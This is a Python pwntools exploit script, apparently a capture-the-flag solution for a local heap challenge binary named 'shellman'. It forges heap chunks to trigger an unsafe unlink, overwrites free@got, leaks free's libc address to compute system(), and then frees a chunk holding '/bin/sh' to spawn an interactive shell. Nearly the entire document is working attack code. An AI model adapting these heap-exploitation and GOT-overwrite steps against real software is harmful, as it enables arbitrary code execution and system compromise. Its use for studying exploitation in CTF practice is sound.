#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *

e = pwnlib.elf.ELF('./shellman')
# free@got
GOT_FREE = e.got['free']

#pwnlib.context.context.log_level = 'debug'
pwnlib.context.context.arch = 'amd64'
p = process('./shellman')

def new_shellcode(content):
    p.sendline('2')
    p.sendline(str(len(content)))
    p.sendline(content)

def edit_shellcode(shellcode_index, content):
    p.sendline('3')
    p.sendline(str(shellcode_index))
    p.sendline(str(len(content)))
    p.sendline(content)

def delete_shellcode(shellcode_index):
    p.sendline('4')
    p.sendline(str(shellcode_index))

def get_free():
    p.sendline('1')
    p.clean(timeout=0)
    p.recvuntil('0: ')
    value = p.recvline(keepends=False).ljust(8, '\x00')[:16]
    return u64(unhex(value))


for i in xrange(4):
    new_shellcode('A'*128)  # aim to use bin, not fastbin
FAKE_CHUNK_0_SIZE = 0x80 + 0x90  # shellcode_0:0x80, shellcode_1:0x90
edit_shellcode(0, p64(0)+p64(FAKE_CHUNK_0_SIZE+1)+p64(0x6016c0-0x8)+p64(0x6016c0)+'A'*(0x80-32))
#                 |- prev_size     size                 fd                     bk           -|
#                 |-                                     fake chunk_0                       ...
edit_shellcode(1, '/bin/sh\x00'+'A'*(0x80-8)+p64(FAKE_CHUNK_0_SIZE)+p64(0x90)+'A'*0x80+p64(0)+p64(0x91)+'A'*0x80+p64(0)+p64(0x91)+'A'*0x80)
#                    fake chunk_0  ...    -| |-             fake chunk_1            -| |-    fake chunk_2     -| |-    fake chunk_3     -|
delete_shellcode(2) # arbitrary DWORD reset, make 0x6016d0=0x6016b8

# free() & system() offset in libc.so.6
LIBC_FREE_RVA = 0x82df0
LIBC_SYSTEM_RVA = 0x46640
# now modify shellcode_0's shellcode is equal to modify 0x6016b8...
edit_shellcode(0, p64(0)+p64(1)+p64(8)+p64(GOT_FREE)) # currently modify 0x6016d0=free@got
free_address = get_free()   # use list_shellcode() to get free() address
system_address = free_address - LIBC_FREE_RVA + LIBC_SYSTEM_RVA # get system() address
edit_shellcode(0, p64(system_address))  # modify 0x6016d0=free@got=system() address
delete_shellcode(1) # now calling free@got is equal to call system(), and shellcode_1's content is "/bin/sh", so we called system("/bin/sh")
p.clean()
p.interactive()

